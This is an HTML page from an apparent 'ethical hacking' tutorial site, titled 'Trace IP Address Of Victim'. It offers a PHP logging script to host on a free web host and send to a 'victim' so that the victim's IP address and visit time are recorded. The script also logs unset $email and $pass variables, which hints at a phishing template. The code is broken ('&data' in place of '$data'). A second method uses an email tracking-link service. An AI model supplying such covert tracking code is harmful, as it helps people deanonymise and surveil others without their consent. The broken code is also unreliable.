<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Trace IP Address Of Victim</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="How to trace the ip address using php script and web tracker" />
	<meta name="keywords" content="How to trace the ip address using php script and web tracker" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.12" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1433701547" rel="stylesheet" type="text/css" />
	<link href="css/32.css?ts=1433701547" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance1629" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li><li><a href="Book/" target="_self" title="Book">Book</a></li><li><a href="Earn-Money/" target="_self" title="Earn Money">Earn Money</a></li><li><a href="http://haktuts.blogspot.in" target="_self" title="Blog">Blog</a></li><li><a href="https://cse.google.com/cse/publicurl?cx=001639366659799729802:vr921b1tgry#gsc.tab=0&amp;gsc.q=haktuts&amp;gsc.sort=" target="_blank" title="Hackers Search Engine">Hackers Search Engine</a></li></ul></div><div id="wb_element_instance1630" class="wb_element"><div></div></div><div id="wb_element_instance1631" class="wb_element"><a class="wb_button" href="Home/"><span>HaKTuts</span></a></div><div id="wb_element_instance1636" class="wb_element"><a class="wb_button" href=""><span>HaKTuts</span></a></div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance1632" class="wb_element" style=" overflow: hidden;"><script id="airpushScript" type="text/javascript" src="//ab.airpush.com/apportal/client/airpush.js?siteid=263411&amp;testmode=0&amp;banner360=1&amp;banner=slot1&amp;placementid=0&amp;tp=0">
</script><style type="text/css">
            button{
                width: 250px;
                height: 250px;
                
            }
            table{
                border: 0;

            }
            body{
                margin: 0;
                padding: 0;
            }
        </style><table><tbody><tr><td id="error" style="color: red">
                          <img src="https://airpushmarketing.s3.amazonaws.com/abstract_examples_web.gif" width="250px"></td>
                    </tr></tbody></table></div><div id="wb_element_instance1633" class="wb_element"><div style="font-size: 1px; overflow: hidden; line-height: 1px; padding: 0; background: transparent; float: none; position: relative; margin: 1px 0 0 0; width: 100%; height: 1px; left: 0; top: 50%; border-top: 1px solid #303030;"></div></div><div id="wb_element_instance1634" class="wb_element"><!-- Tags Code For AdPrimary.Com -->
<script type="text/javascript">
document.write('<s'+'cript src="http://c.pioneeringad.com/?adid=8905&adtp=banner&adsz=1&adrd='+new Date().getTime()+'" type="text/javascript">'+'cript>');
</script><!-- End Tags AdPrimary.Com --></div><div id="wb_element_instance1637" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1">Method 1</h1>

<p> </p>

<p> </p>

<h2 class="wb-stl-heading2">How to trace the ip address of victim.</h2>

<p> </p>

<p class="wb-stl-normal"><br>
&lt;?php<br>
$ip = $_SERVER['REMOTE_ADDR'];<br>
$dt = date("l ds \of F Y h:i:s A");<br>
$file=fopen("ip_log.txt","a");<br>
&amp;data = $email.' '.' '.$pass.' '.' '.$ip.'<br>
'.$dt."\n";<br>
fwrite($file, $data);<br>
fclose($file);<br>
header( 'Location: http://your website.com/');<br>
?&gt; </p>

<p class="wb-stl-normal"><br>
Copy the above code in a notepad (without quotes) and save it as ip.php</p>

<p class="wb-stl-normal"><br>
Now make a other notepad with name ip_log in ip_log all the ip will be stored</p>

<p class="wb-stl-normal"><br>
Now what u have to do is find a free webs hosting site i.e 000.webhost.com and upload both the files in root directory i.e. ip.php and ip_log and link will be generated when u give this link to any victim his ip will be save in ip_log file as soon as it clicks on the link .</p>

<p> </p>

<h1 class="wb-stl-heading1"> <br>
Method 2</h1>

<p> </p>

<p class="wb-stl-normal">1.Go to site http://whatstheirip.com</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">2.Enter the email address </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">3.login to email id and send the tracking code and as victim click on our tracking code you will get the ip address of victim. </p>

<p> </p>
</div><div id="wb_element_instance1638" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(32);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance1638");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance1638").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 161px;">
	
<div id="wb_element_instance1635" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle">haktuts © 2014. All Rights Reserved </h4>
</div><div id="wb_element_instance1639" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>